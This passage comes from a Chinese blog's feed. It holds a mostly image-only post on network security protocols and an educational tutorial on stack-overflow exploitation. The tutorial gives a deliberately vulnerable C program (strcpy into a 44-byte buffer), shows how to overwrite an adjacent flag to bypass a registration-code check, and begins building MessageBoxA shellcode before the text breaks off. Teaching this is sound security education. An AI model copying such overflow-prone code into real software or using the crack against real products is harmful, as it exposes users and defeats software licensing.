        <content type="html"><![CDATA[<h2 id="密码算法在网络各层中的部署"><a href="#密码算法在网络各层中的部署" class="headerlink" title="密码算法在网络各层中的部署"></a>密码算法在网络各层中的部署</h2><p><strong>网络安全协议的构造</strong></p><ul><li>加密和认证算法是构造网络安全协议的基本模块</li><li>在不同的层次实施加密算法具有不同的效果</li><li>应该在网络体系中的哪一个层次部署安全协议？</li></ul><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/e4be91464b3b8e240d6157cdea4b5444.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/e4be91464b3b8e240d6157cdea4b5444.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/02fb6464246b4ebe166143ee786ce9b7.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/02fb6464246b4ebe166143ee786ce9b7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/def7f0aa75cb9f4616d8104a1808ad30.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/def7f0aa75cb9f4616d8104a1808ad30.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/21241c5f4e96a506e444263abd043919.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/21241c5f4e96a506e444263abd043919.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/cf89bf5038613adb8cb891abccc8f215.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/cf89bf5038613adb8cb891abccc8f215.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/c4d53795bd0983627f5bd1e62380e9cd.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/c4d53795bd0983627f5bd1e62380e9cd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="公钥基础设施"><a href="#公钥基础设施" class="headerlink" title="公钥基础设施"></a>公钥基础设施</h2><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/ca0f5e9f360adaaa1f37fe25d4f78f29.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/ca0f5e9f360adaaa1f37fe25d4f78f29.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9bf2a5b0c99cd710456cfd887eb39a99.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9bf2a5b0c99cd710456cfd887eb39a99.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/fc6b62d3d4850485dbf404b32e838651.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/fc6b62d3d4850485dbf404b32e838651.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/0ae819892c877d0accf5d39fe5c9dd1c.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/0ae819892c877d0accf5d39fe5c9dd1c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="IPsec协议"><a href="#IPsec协议" class="headerlink" title="IPsec协议"></a>IPsec协议</h2><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/d219784bf101ec6fb9be65f8a4c2b8bd.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/d219784bf101ec6fb9be65f8a4c2b8bd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/8a1c1ab41f0d0704db4d3ab299aef273.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/8a1c1ab41f0d0704db4d3ab299aef273.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/7b5028b6456df98f863f187548d48d18.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/7b5028b6456df98f863f187548d48d18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/0f295f9bf058b1fee460e54b8585d0d7.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/0f295f9bf058b1fee460e54b8585d0d7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/ccd06e9e09d971089592604ab67215cb.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/ccd06e9e09d971089592604ab67215cb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/5fd440ad9eee58ab4319e0b7aa302a6b.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/5fd440ad9eee58ab4319e0b7aa302a6b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/4a600e2c0e726a6630e9c330f1218c85.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/4a600e2c0e726a6630e9c330f1218c85.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/72b3f5c19da230a86e63b81105061177.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/72b3f5c19da230a86e63b81105061177.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9a9ae4b3b82db7e9c71485552beef769.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9a9ae4b3b82db7e9c71485552beef769.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/2d248e977e9e6c0404b8efe85070f15a.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/2d248e977e9e6c0404b8efe85070f15a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/fffca245db7102041a4f5a8014391d08.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/fffca245db7102041a4f5a8014391d08.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9486000fe00156a6301df8c8fcb37e7c.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9486000fe00156a6301df8c8fcb37e7c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/45faf335c65feaad6fcf030ca79056af.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/45faf335c65feaad6fcf030ca79056af.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="SSL-TLS协议"><a href="#SSL-TLS协议" class="headerlink" title="SSL TLS协议"></a>SSL TLS协议</h2><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/b6e301751984461192e5fe3853134baf.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/b6e301751984461192e5fe3853134baf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/3ced0b47c4117c4c59d25bed5f7c5fb1.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/3ced0b47c4117c4c59d25bed5f7c5fb1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/6217be7a2007a8f16c4eeeec8ca8b0ed.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/6217be7a2007a8f16c4eeeec8ca8b0ed.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p> <img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/feb87baf438f6431cd06358d44ebcd9f.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/feb87baf438f6431cd06358d44ebcd9f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/85004a1eb364b4c894d3c179167ab7b1.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/85004a1eb364b4c894d3c179167ab7b1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/359a5096cec0ede426982d8e7f21886a.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/359a5096cec0ede426982d8e7f21886a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/58e3afd7cd718f23af01c4744a4e2d20.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/58e3afd7cd718f23af01c4744a4e2d20.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/689844a1928f6c6d0a7a1a25e192a8f5.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/689844a1928f6c6d0a7a1a25e192a8f5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/08a624297825b833b3090bc34363baff.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/08a624297825b833b3090bc34363baff.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/3d34cd516a0f75f82f1968f2cb9062bf.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/3d34cd516a0f75f82f1968f2cb9062bf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/6fe03e265999917353690cb1e04cae05.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/6fe03e265999917353690cb1e04cae05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/104a8ebd881a8a78c558fee53a6872ca.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/104a8ebd881a8a78c558fee53a6872ca.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/8bacb11a5085b9fb4d12b5c4091ae10e.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/8bacb11a5085b9fb4d12b5c4091ae10e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/18294a5a03724e28018276506cc78f93.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/18294a5a03724e28018276506cc78f93.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/03ce26744eee33e3d026fd81dd8332a2.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/03ce26744eee33e3d026fd81dd8332a2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9197f5e65736ca2bf6b048dc8ed82df1.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/9197f5e65736ca2bf6b048dc8ed82df1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/423e921e87ed75bb4d5353e610a666bd.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/423e921e87ed75bb4d5353e610a666bd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/780d49233276da567fcc5731908c8a5b.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/780d49233276da567fcc5731908c8a5b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/63eddef7717d82eb52c7ad5991cb5e82.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/63eddef7717d82eb52c7ad5991cb5e82.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/079c3a2a8c669f12620bd2e1adf49d2b.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/079c3a2a8c669f12620bd2e1adf49d2b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/4f3564344c20db27d9ce4f2d996f2e84.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/4f3564344c20db27d9ce4f2d996f2e84.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/a58bde96793e93b34e8237d56f4526bb.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/a58bde96793e93b34e8237d56f4526bb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/3ef977da970bc4229dd32156f1e8a3c3.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/3ef977da970bc4229dd32156f1e8a3c3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/8b34ad3b30076fa096d03fed31a0bc04.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/8b34ad3b30076fa096d03fed31a0bc04.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/d2d2d13089c0adfe402d91db7f5509e3.png" class="lazyload placeholder" data-srcset="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/d2d2d13089c0adfe402d91db7f5509e3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> 安全协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞利用篇</title>
      <link href="/2023/03/14/lou-dong-li-yong-pian/"/>
      <url>/2023/03/14/lou-dong-li-yong-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞利用概念及示例"><a href="#漏洞利用概念及示例" class="headerlink" title="漏洞利用概念及示例"></a>漏洞利用概念及示例</h1><h2 id="漏洞利用概念"><a href="#漏洞利用概念" class="headerlink" title="漏洞利用概念"></a>漏洞利用概念</h2><p><strong>漏洞利用（exploit）</strong>是指针对已有的漏洞，根据漏洞的类型和特点而采取相应的技术方案，进行尝试性或实质性的攻击。Exploit 的英文意思就是利用，它在黑客眼里就是漏洞利用。有漏洞不一定就有Exploit（利用），但是有Exploit就肯定有漏洞。</p><p>假设，刚刚发现了一个Minishare的0Day漏洞。Minishare是一款文件共享软件，该0Day漏洞是一个缓冲区溢出漏洞，这个漏洞影响之前的所有版本。当用户向服务器发送的报文长度过大（超过堆栈边界）时就会触发该漏洞。</p><p>得到该漏洞后，可以做点什么呢？善意点的，可以对同学或者朋友的电脑搞搞恶作剧，让他的电脑弹出个对话框之类的。恶意的话，可以利用这个漏洞来向目标机器植入木马，窃听用户个人隐私等。</p><h3 id="漏洞利用手段"><a href="#漏洞利用手段" class="headerlink" title="漏洞利用手段"></a>漏洞利用手段</h3><p>在1996年，Aleph One在Underground发表了著名论文《SMASHING THE STACK FOR FUN AND PROFIT》，其中详细描述了<strong>Linux系统中栈的结构和如何利用基于栈的缓冲区溢出</strong>。在这篇具有划时代意义的论文中，Aleph One演示了如何向进程中植入一段用于获得shell的代码，并在论文中称这段被植入进程的代码为“<strong>shellcode</strong>”。</p><h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><p>实际上，Shell是一个命令解释器，它解释由用户输入的命令并且把它们送到内核。</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>现在，“shellcode”已经表达的是<strong>广义上的植入进程的代码</strong>，而不是狭义上的仅仅用来获得shell的代码。</p><h3 id="漏洞利用的核心"><a href="#漏洞利用的核心" class="headerlink" title="漏洞利用的核心"></a>漏洞利用的核心</h3><p>漏洞利用的核心就是利用程序漏洞去劫持<strong>进程的控制权</strong>，实现<strong>控制流劫持</strong>，以便执行植入的shellcode或者达到其它的攻击目的。</p><p>当攻击者掌握了被攻击程序的内存错误漏洞后，一般会考虑发起控制流劫持攻击。早期的攻击通常采用代码植入的方式，通过上载一段代码，将控制转向这段代码执行。在栈溢出漏洞的利用过程中，攻击的目的是<strong>淹没返回地址</strong>，以便劫持进程的控制权，<u>让程序跳转去执行shellcode</u>。 </p><h4 id="Exploit的结构"><a href="#Exploit的结构" class="headerlink" title="Exploit的结构"></a>Exploit的结构</h4><p>要完成攻击，Exploit需要执行shellcode，但Exploit中并不仅是shellcode。</p><ul><li>Exploit要达到攻击目标，要做的工作更多，比如<strong>对应的触发漏洞</strong>、<strong>将控制权转移到shellcode</strong>一般均不相同，而且他们通常独立于shellcode的代码。</li><li>能实现特定目标的Exploit的有效载荷，称为<code>Payload</code>。</li></ul><blockquote><p>一个经典的比喻，将漏洞利用过程比作导弹发射的过程：<u><strong>Exploit、payload和shellcode</strong>分别是导弹发射装置、导弹和弹头</u>。Exploit是导弹发生装置，针对目标发射导弹（payload）；导弹到达目标之后，释放实际危害的弹头（类似shellcode）爆炸；导弹除了弹头之外的其余部分用来实现对目标进行<strong>定位追踪、对弹头引爆</strong>等功能，在漏洞利用中，对应payload的非shellcode的部分。</p></blockquote><p>Exploit是指利用漏洞进行攻击的动作；Shellcode用来实现具体的功能；Payload除了包含shellcode之外，还需要考虑如何触发漏洞并让系统或者程序去执行shellcode。</p><h2 id="覆盖临接变量示例"><a href="#覆盖临接变量示例" class="headerlink" title="覆盖临接变量示例"></a>覆盖临接变量示例</h2><p>假设我们已知一个系统的注册机验证过程的漏洞，程序举例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define REGCODE &quot;12345678&quot;</span><br><span class="line">int verify (char * code)&#123;</span><br><span class="line">    int flag;</span><br><span class="line">    char buffer[44];</span><br><span class="line">    flag=strcmp(REGCODE, code);</span><br><span class="line">    strcpy(buffer, code);</span><br><span class="line">    return flag; </span><br><span class="line">&#125;</span><br><span class="line">//假设其主程序启动的时候要校验注册码</span><br><span class="line">void main()&#123;</span><br><span class="line">    int vFlag=0;</span><br><span class="line">    char regcode[1024];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">    if(!(fp=fopen(&quot;reg.txt&quot;,&quot;rw+&quot;)))   exit(0); </span><br><span class="line">    fscanf(fp,&quot;%s&quot;, regcode);</span><br><span class="line">    vFlag=verify(regcode);</span><br><span class="line">    if(vFlag)   </span><br><span class="line">      printf(&quot;wrong regcode!&quot;);</span><br><span class="line">    else   </span><br><span class="line">      printf(&quot;passed!&quot;); </span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="verify函数的缓冲区"><a href="#verify函数的缓冲区" class="headerlink" title="verify函数的缓冲区"></a>verify函数的缓冲区</h3><p>Verify函数的缓冲区为44个字节，对应的栈帧状态如下图所示：</p><p><img src="/2023/03/14/lou-dong-li-yong-pian/747c7e35dc8f2b52b379c335ba1a9192.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/747c7e35dc8f2b52b379c335ba1a9192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="漏洞利用：覆盖临接变量"><a href="#漏洞利用：覆盖临接变量" class="headerlink" title="漏洞利用：覆盖临接变量"></a>漏洞利用：覆盖临接变量</h3><blockquote><p>软件漏洞篇讲栈溢出漏洞时提到覆盖临接变量示例</p></blockquote><p><strong>利用目标</strong>：利用溢出覆盖临接变量，实现控制流劫持，完成软件破解。</p><p>利用这个漏洞，我们可以破解该软件，让注册码无效。只需要想法<strong>淹没flag状态位</strong>，使其<strong>变为0</strong>即可，则只需要设计：buffer（44字节）+1字节（整数0），即在reg.txt中写入45个字节，其中最后1个字节为0。</p><p>如果能对reg.txt写入二进制数据，我们利用Ultraedit打开reg.txt，并在该文件中写入</p><p><code>“123412341234123412341234123412341234123412341”。需要将最后1个字节由ASCII-1改为全0。</code></p><h2 id="Shellcode代码植入示例"><a href="#Shellcode代码植入示例" class="headerlink" title="Shellcode代码植入示例"></a>Shellcode代码植入示例</h2><h3 id="漏洞利用：代码植入"><a href="#漏洞利用：代码植入" class="headerlink" title="漏洞利用：代码植入"></a>漏洞利用：代码植入</h3><p><strong>利用目标</strong>：利用溢出覆盖返回地址，转去执行植入的恶意程序。 </p><p><img src="/2023/03/14/lou-dong-li-yong-pian/7319a7b7f2de4a656ae4975ee3234d74.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/7319a7b7f2de4a656ae4975ee3234d74.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>基于上述程序，编写shellcode，完成代码植入</p><blockquote><p>Shellcode往往需要用<strong>汇编语言</strong>编写，并<strong>转换成二进制机器码</strong>，其内容和长度经常还会受到很多苛刻限制，故<u>开发和调试的难度很高</u>。</p></blockquote><p>植入代码之前要做大量的调试工作，比如：</p><ol><li>弄清楚程序有几个输入点，这些输入将最终会当作哪个函数的第几个参数读入到内存的哪一个区域，<strong>哪一个输入会造成栈溢出</strong>，在复制到栈区的时候对这些数据有没有额外的限制等；</li><li>调试之后还要计算<strong>函数返回地址距离缓冲区的偏移</strong>并淹没之;</li><li><strong>选择指令的地址</strong>, 最终制作出一个有攻击效果的“承载”着<code>shellcode</code>的输入字符串。</li></ol><h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p><strong>目标</strong>：编写一段代码，使其能够淹没返回地址，该返回地址将执行一个MessageBox函数，弹出窗体。</p><p>为了能淹没返回地址，需要在reg.txt中至少写入：buffer(44字节)+flag(4字节)+前EBP值(4字节)，也就是53—56才是要淹没的地址。让程序弹出一个消息框只需要调用Windows的API函数MessageBox。</p><p>MSDN对MessageBox函数的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int MessageBox(</span><br><span class="line">HWND hWnd,          // handle to owner window</span><br><span class="line">LPCTSTR lpText,        // text in message box</span><br><span class="line">LPCTSTR lpCaption,     // message box title</span><br><span class="line">UINT uType            // message box style</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>hWnd<blockquote><p>消息框所属窗口的<strong>句柄</strong>，如果为NULL，消息框则不属于任何窗口。</p></blockquote></li><li>lpText<blockquote><p>字符串指针，所指字符串会在消息框中显示。</p></blockquote></li><li>lpCaption<blockquote><p>字符串指针，所指字符串将成为消息框的标题。</p></blockquote></li><li>uType<blockquote><p>消息框的风格（单按钮、多按钮等），NULL代表默认风格。</p></blockquote></li></ul><p>我们将写出调用这个API的<strong>汇编代码</strong>，然后翻译成<strong>机器代码</strong>，用十六进制编辑工具填入reg.txt文件。<code>注意：使用MessageBoxA函数。</code></p><h4 id="用汇编语言编写MessageBoxA需要三个步骤"><a href="#用汇编语言编写MessageBoxA需要三个步骤" class="headerlink" title="用汇编语言编写MessageBoxA需要三个步骤"></a>用汇编语言编写MessageBoxA需要三个步骤</h4><ol><li>装载动态链接库user32.dll。<u>MessageBoxA是动态链接库user32.dll的导出函数</u>。虽然大多数有图形化操作界面的程序都已经装载了这个库，但是我们用来实验的consol版并没有默认加载它。</li><li>在汇编语言中调用这个函数需要获得函数的入口地址。</li><li>在调用前需要向栈中按从右向左的顺序压入4个参数。为了让植入的机器代码更加简洁明了，我们在实验准备中构造漏洞程序的时候已经<strong>人工加载了user32.dll这个库</strong>，所以第一步操作不用在汇编语言中考虑。</li></ol><p><strong>第一步：获取函数入口地址</strong></p><blockquote><p>获取函数入口地址：MessageBoxA的入口地址可以通过user32.dll在系统中加载的<strong>基址</strong>和MessageBoxA在库中的<strong>偏移</strong>相加得到。可以使用VC6.0自带的小工具“Dependency Walker”获得这些信息，如下图user32.dll的基地址为 0x77D10000，MessageBoxA的偏移地址为0x000407EA。基地址加上偏移地址就得到了MessageBoxA函数在内存中的入口地址：0x77D507EA。</p></blockquote><p><img src="/2023/03/14/lou-dong-li-yong-pian/2c6f87661e80ee833b0b88cc209735fe.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/2c6f87661e80ee833b0b88cc209735fe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>使用代码来获取相关函数地址：在C/C++语言中，<code>GetProcAddress</code>函数<strong>检索指定的动态链接库（DLL）中的输出库函数地址</strong>。如果函数调用成功，返回值是DLL中的输出函数地址。函数原型如下：</p></blockquote><figure class="highlight 